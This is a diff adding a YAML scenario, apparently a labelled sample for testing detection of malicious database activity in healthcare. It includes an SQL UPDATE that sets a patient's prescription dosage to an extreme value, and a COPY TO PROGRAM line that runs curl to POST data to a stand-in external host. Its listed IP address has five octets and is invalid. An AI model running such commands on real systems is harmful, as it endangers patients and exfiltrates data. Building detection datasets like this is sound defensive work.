@@ -1,0 +1,23 @@
+scenario_id: gen_healthcare_25_data_tamper_mal_627
+family_id: gen_healthcare_25_data_tamper_mal_fam627
+domain: healthcare
+time_of_day: 04:20
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: nurse
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.5
+  events:
+  - step_id: act
+    sql: UPDATE prescriptions SET dosage = 766499 WHERE patient_id = 73187
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://clearinghouse-batch.example/ingest
+      -d @-'
+    connects_to:
+      ip: 91.219.236.23.220
+      port: 443
